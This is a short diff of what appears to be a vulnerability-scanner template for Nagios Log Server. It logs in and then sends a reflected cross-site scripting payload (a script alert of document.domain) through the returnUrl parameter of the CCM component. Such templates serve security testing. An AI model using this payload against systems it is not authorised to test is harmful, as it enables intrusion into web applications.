@@ -28,14 +28,12 @@ http:
       - |
         GET /nagioslogserver/login HTTP/1.1
         Host: {{Hostname}}
-
       - |
         POST /nagioslogserver/login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         csrf_ls={{csrf}}&username={{username}}&password={{password}}
-
       - |
         GET /nagioslogserver/includes/components/ccm/?cmd=modify&id=1&page=1&returnUrl=%22%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&type=host HTTP/1.1
         Host: {{Hostname}}
